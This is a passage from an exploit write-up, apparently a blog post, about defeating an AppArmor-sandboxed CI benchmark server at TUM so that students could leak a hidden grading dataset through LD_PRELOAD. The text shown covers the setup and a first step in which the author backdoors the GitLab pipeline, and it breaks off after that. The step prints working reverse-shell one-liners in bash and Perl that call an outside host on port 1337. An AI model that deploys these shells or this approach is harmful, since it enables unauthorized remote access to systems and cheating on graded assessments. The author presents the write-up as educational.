# Abstract

**Extracting secret data protected by an AppArmor profile by injecting a custom library function with `LD_PRELOAD`.**


This is a TUM internal exploit, but I'm still publishing this writeup for educational purposes, as I consider both the security set-up and the exploitation strategy interesting.

<img src="img/AppArmor.png" alt="AppArmor" width="200"/>

[AppArmor](https://www.apparmor.net/) is a Linux kernel security module that offers *per-program* security policies.
Programs are identified by **path**. Authorized programs can switch between different security policies at runtime.


## Background
The set-up can roughly be explained as follows:

The Students have to write a highly optimized C++ program that can parse multiple gigabytes of data in just a few milliseconds (by using SIMD/AVX instructions).
They push their source code to a GitLab instance, which then builds and tests their solution against a hidden dataset, so that the students can not cheat by hardcoding the answer.
The only piece of information they get back is whether their submission was a success or failure.
If their submission is fast enough, they get a grade bonus for the exam.

If one were able to leak the test dataset, one could either hard-code an answer, or optimize ones submission against the test dataset, claiming pole position on the leaderboard.

As the students are able to submit arbitrary code, a special solution was devised to keep them from leaking the hidden dataset:
1. The student program is compiled and uploaded to the test server. In this case the test server is an actual physical machine, so that benchmark results are reported accurately. It offers access to an *unprivileged* user account, that is not allowed to read the test dataset, but can otherwise freely use the system.

2. A special, *trusted* `measure` program is accessible to the unprivileged user. The `measure` program can only be read or executed, but not modified.
It performs the following three crucial functions:
    1. It uses AppArmor to [change the active security profile](https://man.archlinux.org/man/aa_change_hat.2.en). The new security profile is allowed to access the test dataset, but not allowed to do any kind of I/O. Among other things, it blocks file system access, network operations and the stdout file descriptor.
    2. It logs the current system time, executes the untrusted user program, redirects its output into a buffer and logs the current time again, once the user program returns or times out.
    3. It swaps the security profile back to the unprivileged profile, compares the logged buffer content with the expected answer, and, if correct, uploads the time required by the user program to generate the answer to the leaderboard.
    It also prints feedback (the measured time required and whether the answer was correct) to stdout.

    
## Exploitation

### 1. Backdooring the GitLab CI/CD pipeline

This is not strictly necessary (and not exactly difficult since we control the GitLab `.gitlab-ci.yml`), but a reverse shell makes it much easier to inspect the system and debug our exploitation efforts on the spot, instead of having to wait for the entire CI/CD pipeline to run through after every change.

A quick reverse shell should be in the repertoire of every hacker.
My personal favorite being a simple:
```bash
sh -i >& /dev/tcp/feuermagier.com/1337 0>&1
```
or alternatively with perl:
```perl
perl -e 'use Socket;$i="feuermagier.com";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
in case the first one is making problems.
You'll be surprised by how many systems and even minimalist dev-containers ship with perl installed.

In any case, this leaves us with a simple, but functional reverse shell.

### 2. 
